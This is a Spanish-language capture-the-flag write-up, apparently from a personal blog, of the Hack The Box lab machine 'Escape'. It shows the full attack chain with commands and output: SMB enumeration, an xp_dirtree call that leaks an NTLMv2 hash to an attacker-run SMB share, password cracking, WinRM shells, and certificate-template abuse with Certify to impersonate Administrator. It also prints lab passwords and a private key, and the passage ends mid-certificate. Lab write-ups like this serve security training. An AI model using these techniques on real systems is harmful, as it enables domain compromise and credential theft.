---
layout: single
title: Escape - Hack The Box
excerpt: "La maquina Escape de dificultad medium de la plataforma de HacktheBox en mi opinion es una buena maquina donde  tendremos que creackear el hash `ntlmv2` de un usuario para poder conectarnos ala maquina despues de eso mediante un archivo que encontramos con credenciales nos vamos a conectar con otro usuario para poder leer la user.txt y de hay elevar privilegios abusando de un template vulnerable y nos conectaremos con evilwinrm como el usuario Administrador con su hash"
date: 2023-02-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-escape/logo2.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - SMB Enumeration
  - NTLMv2 Hash
  - Misconfigured Certificate Template 
---
![](/assets/images/htb-writeup-escape/logo2.png)

Por el `ttl` sabemos que estamos ante una maquina `Windows`

```bash
❯ ping -c 1 10.129.163.81
PING 10.129.163.81 (10.129.163.81) 56(84) bytes of data.
64 bytes from 10.129.163.81: icmp_seq=1 ttl=127 time=173 ms

--- 10.129.163.81 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 172.719/172.719/172.719/0.000 ms
```

## PortScan

```bash
❯ nmap -sCV -p53,135,139,389,445,464,593,3269,5985,49682 10.129.163.81 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 10:57 CST
Nmap scan report for 10.129.163.81
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-02-27T00:59:16+00:00; +7h59m58s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T00:59:17+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49682/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s
| smb2-time: 
|   date: 2023-02-27T00:58:37
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.43 seconds
```

## Enumeration

Estamos ante un `Windows 10` y el dominio se llama `sequel.hbt`

```bash
❯ crackmapexec smb 10.129.163.81
SMB         10.129.163.81   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

Vamos a emplear un `Null sesion` para ver recursos compartidos

```bash
❯ smbclient -N -L 10.129.163.81

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Vamos a ver que hay y vemos un archivo `PDF` vamos a traerlo a nuestro maquina de atacante para ver que es lo que dice

```bash
❯ smbclient -N //10.129.163.81/Public
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 05:51:25 2022
  ..                                  D        0  Sat Nov 19 05:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 07:39:43 2022

		5184255 blocks of size 4096. 1315702 blocks available
smb: \> 

```

```bash
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (44.0 KiloBytes/sec) (average 44.0 KiloBytes/sec)
smb: \> 
```

Si abrimos el archivo esto es lo que dice 

![](/assets/images/htb-writeup-escape/1.png)

Dicen que han tenido algunos accidentes con los servidores de `SQL` 

Al final del archivo nos comparten unas credenciales estan hablando de `mysql` asi que podemos ver si funcionan las credenciales para conectarnos a la base de datos

![](/assets/images/htb-writeup-escape/2.png)

`PublicUser:GuestUserCantWrite1`

Vamos a emplear una herramienta de `impacket`


```bash
❯ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.129.163.81
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 

```

Buscando informacion de que podemos hacer vi que podemos ejecutar estos comandos

```bash
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> 

```

<https://www.acunetix.com/blog/articles/sqli-part-6-out-of-band-sqli/>

```
Out-of-band SQLi techniques would rely on the database server’s ability to make DNS or HTTP requests to deliver data to an attacker. Such is the case with Microsoft SQL Server’s `xp_dirtree` command,
```

Quiero suponer que podemos conseguir un hash `ntlmv2`

Lo que estamos haciendo es creando un recurso compartido con `impacket-smbserver` llamado `parrotsec` y al autenticarse nos llega el `hash` de un usuario

```bash
SQL> xp_dirtree '\\10.10.15.82\parrotsec'
```

Tenemos que hash de `sql_svc`

```bash
❯ impacket-smbserver parrotsec . -smb2support
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.163.81,51339)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:91fdd62fc0a77f4296181ec3c0915c68:010100000000000000bdd60f0a4ad901984a8b43272d2b2f0000000001001000410074006a0057004c0074004600670003001000410074006a0057004c007400460067000200100057006f004a004c0051005a0049004b000400100057006f004a004c0051005a0049004b000700080000bdd60f0a4ad901060004000200000008003000300000000000000000000000003000003c469c61e43f08ff589aafd16eb831b0afea23eedc62dedd6262513e4588e7100a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00380032000000000000000000
[*] Closing down connection (10.129.163.81,51339)
[*] Remaining connections []

```

Vamos a crackear el `hash` con `john`

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)
1g 0:00:00:14 DONE (2023-02-26 11:50) 0.06858g/s 733936p/s 733936c/s 733936C/s REINLY..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Tenemos credenciales

`sql_svc:REGGIE1234ronnie`

Vamos a validar si son correctas para conectarnos con `evilwinrm`

```bash
❯ crackmapexec winrm 10.129.163.81 -u 'sql_svc' -p 'REGGIE1234ronnie'
SMB         10.129.163.81   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.163.81   5985   DC               [*] http://10.129.163.81:5985/wsman
WINRM       10.129.163.81   5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)

```

Si usamos `rpcclient` nos podemos conectar usando las credenciales de `sql_svc`

```bash
❯ rpcclient -U "sql_svc" 10.129.163.81
Password for [WORKGROUP\sql_svc]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Tom.Henn] rid:[0x44f]
user:[Brandon.Brown] rid:[0x450]
user:[Ryan.Cooper] rid:[0x451]
user:[sql_svc] rid:[0x452]
user:[James.Roberts] rid:[0x453]
user:[Nicole.Thompson] rid:[0x454]
rpcclient $> 
```

Vemos mas usuarios ahora vamos a ver lo grupos

```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> 
```

Vamos a ver si encontramos mas informacion del grupo `Domain Admins` 

Pero solo hay un usuario en ese grupo que es el `Administrator`

```bash
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	dom, 26 feb 2023 16:55:29 CST
	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
	Kickoff Time             :	mié, 31 dic 1969 18:00:00 CST
	Password last set Time   :	vie, 18 nov 2022 15:13:17 CST
	Password can change Time :	sáb, 19 nov 2022 15:13:17 CST
	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00004210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000053
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> 
```

Bueno vamos a conectarnos con `evilwinrm` con las credenciales que teniamos por que cuando obtuvimos el `ticket` solo un usuario lo proporcionaba si no hubieramos tenido las credenciales que nos proporcionarion al principio en el `pdf` tal vez no hubieramos tenido el `ticket` asi de rapido

```
❯ /bin/cat /etc/hosts | tail -n 1
10.129.163.81 sequel.htb
```

```bash
❯ impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Tom.Henn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brandon.Brown doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ryan.Cooper doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User James.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Bueno ahora ya podemos conectarnos

```bash
❯ evil-winrm -i 10.129.163.81 -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

```bash
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

Si nos vamos a la `raiz` podemos ver un directorio llamado `SQLServer` 

```bash
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows


*Evil-WinRM* PS C:\> cd SQLServer
```

Dentro del el hay un archivo `Logs` que por el nombre ya suena interesante

```bash
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> 
```

Hay un archivo `.BAK`

![](/assets/images/htb-writeup-escape/3.png)

Quiero suponer que dentro de este archivo podemos encontrar credenciales de algun usuario que su autenticacion fue `fallida` 

![](/assets/images/htb-writeup-escape/4.png)

```bash
*Evil-WinRM* PS C:\SQLServer\Logs> Select-String "failed" ERRORLOG.BAK

ERRORLOG.BAK:36:2022-11-18 13:43:06.06 Server      Perfmon counters for resource governor pools and groups failed to initialize and are disabled.
ERRORLOG.BAK:112:2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
ERRORLOG.BAK:114:2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]


*Evil-WinRM* PS C:\SQLServer\Logs> 
```

`Ryan.Cooper:NuclearMosquito3`

Vamos a ver si las credenciales son correctas

```bash
❯ crackmapexec winrm 10.129.163.81 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
SMB         10.129.163.81   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.163.81   5985   DC               [*] http://10.129.163.81:5985/wsman
WINRM       10.129.163.81   5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)

```

Podemos conectarnos

```bash
❯ evil-winrm -i 10.129.163.81 -u Ryan.Cooper -p NuclearMosquito3

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
```

## User flag

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
4b33ce2b4b5a8721a2270d553b4357dd
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> 
```

## Escalada de privilegios

Vamos a subir el `winpeas` ala maquina 

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload winPEASx86.exe
Info: Uploading winPEASx86.exe to C:\Users\Ryan.Cooper\Documents\winPEASx86.exe

                                                             
Data: 2626216 bytes of 2626216 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> ls


    Directory: C:\Users\Ryan.Cooper\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/26/2023   6:32 PM        1969664 winPEASx86.exe


*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

Esto es interesante

```bash
 Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=0
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
       Smart Card Logon
       KDC Authentication
   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=sequel-DC-CA, DC=sequel, DC=htb
  ValidDate          : 11/18/2022 12:58:46 PM
  ExpiryDate         : 11/18/2121 1:08:46 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : A263EA89CAFE503BB33513E359747FD262F91A56

   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=dc.sequel.htb
  ValidDate          : 11/18/2022 1:20:35 PM
  ExpiryDate         : 11/18/2023 1:20:35 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : 742AB4522191331767395039DB9B3B2E27B6F7FA

  Template           : DomainController
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
   =================================================================================================
```

Al encontrar ese `Template` vamos a correr este <https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe>

Y vamos a ver si nos encuentra otro, vamos a subirlo de la misma forma que el `winpeas`

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> dir


    Directory: C:\Users\Ryan.Cooper\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/26/2023   6:52 PM         174080 Certify.exe
```

En este articulo nos explican como usar el script <https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin>

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.4832515
```

Vamos a seguir los pasos del articulo y tenemos que solicitar un certificado y una key privada

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxefAF4mwtnIzLSWGs7SA7HhpQGMf4hFP3GwP855odM9u9Tf7
xBkeQluFdN5gdQ6eMgKJmFT/YNWPdURhQOf5cQmVvJbdplcGNAOgh3RMC8ToMjDI
cuBBWk2Pjvh7lmWwI6/OqUh0+xer7EubbJzCQtEUfurFoZM6hXN9B1cmIlNq9QOn
urEOkfZEBruyszkxdA5Lf6ND8crRBVm2n5XUQrEzgPiKw3TMIY8KoE3S52iVK7pb
Gp+ZT9mBJWjhDfKtHPFykTJtSHFiisOWmRATsIty5GNAqi0e71ZNzxKmsLJhppvE
8GQU9ROjPkDzkl5U+MTgekkoqoz2FMZs/xN/0QIDAQABAoIBAQC6PW+uNutPpoS2
lbv/3Xv+DQqvhxj3++a1vhP85TPTyWnX5slNL34kYFBlPOh1AD6rPWwTKNnzXMZW
SvViyWsajzSUdz07TmYOCOPG1RDDepgws2vPf27A9oCEwR482JE75DSNZhyANzSZ
eEVZnuPJUU0Caxl1BkJqV9ZvU/oVDdapvG6rELI6GQax9YmcWiDLYouSUKRFej+F
npTvturKtmN5FaVp63YNISyZiDsOvEz7HSQjonW/9ogquDZIEfZg2iJQUOlFppEP
1K3+K8RjF2Q4FXH9RDhD9sT++gVbHZ7VZJeoOFAx5tY22IN8obIwmzokOIy2hDRp
s7mA3WfpAoGBANEH81d7C7uy4vViUJbR+ywIWxelH66RcPupbVpMaK+Fox1/WRnK
RWIURQabPiQFKF7tHkk+QTU9CckmPvlJErJmIzV8+EbWNAQjy74h4lizMOR6TTs0
carD/WQw2PKrlYXMfAWvnjZIibb8RCi/mAZ2hFBN+tuBSyEjpKCmed2PAoGBAPJf
0FSZzhisTiNen/ncISa+7W1DwQOF5bzz3GCmHHA4H4CPoJfaJDcikdOgSqXUtqD1
DlIyJdm5QFbaaRGmaBeopilPje7MKiF3SlcnjLEB52w0iHXN1mURV5BPLBhmS/8D
j2z6yiKbJHNWF1kcKCn0gLlaFCK+RwZap5ErRNyfAoGAaEPg+7fiqGOYlfHOZQyk
jtg0J90zqm3dv4pJg4sthK/SJzqIhTbB2SRnMd5p5qmz83Wvb7Vf7WBe6zjqnIn4
i4gq89k8NolONOpuDI72SmxHbRAcSfXk5NsSH9HFxXYVBUJ0cpmg/067cszuaqz2
9fJUGYJsKOWbRhJzYbbofr0CgYEAqBcw+WtNlqjw6/C1C+jRiPiC2vNRSeszoC6T
mOe680zI9DUn0Ah2c1JjRhx1iLqUCd7KFtE2lN+4MkP4+EerCzVoP2Av8/veACWm
BfmkxiGm6NEqDmE5nhA/5RIzZ5ySegJzFsZ7JzLnPaHoQWGYrTgnieRh8JJ72XlH
mxMiB8sCgYEAj33rinZxlVAHNPs4edKIFjBbhy6GXDNZH10NspjSb17bpkmexMjr
bO6LBndbel3LZLQPVhnPOD/h4SS/sFJSQT/ehf1Sy6Sa47BS+bYU71w6mREWoijV
ClcFRksNxXdJeeGbwi5lGRtGaOsNfPgtVr+18Usc3IKVkvIomNv0DEI=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAApTRaR5/GJHNgAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMjI3MDI0ODI5WhcNMjUwMjI3
MDI1ODI5WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDF58AXibC2cjMtJYaztIDseGlA
Yx/iEU/cbA/znmh0z271N/vEGR5CW4V03mB1Dp4yAomYVP9g1Y91RGFA5/lxCZW8
lt2mVwY0A6CHdEwLxOgyMMhy4EFaTY+O+HuWZbAjr86pSHT7F6vsS5tsnMJC0RR+
6sWhkzqFc30HVyYiU2r1A6e6sQ6R9kQGu7KzOTF0Dkt/o0PxytEFWbafldRCsTOA
+IrDdMwhjwqgTdLnaJUrulsan5lP2YElaOEN8q0c8XKRMm1IcWKKw5aZEBOwi3Lk
Y0CqLR7vVk3PEqawsmGmm8TwZBT1E6M+QPOSXlT4xOB6SSiqjPYUxmz/E3/RAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFOzynQYoCjohv9DPNeC1USukcB8t
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAplRklCPWoIELHEiQDUAa2hhEycIr0akv57nGLAbm14//+x6l5aS4hhgr
n+/6Ft08LjgxsL5kbA3USdevDi1GaQ+pKgTh+xyk3T1QPD+wN47fQIYsXw9BQonj
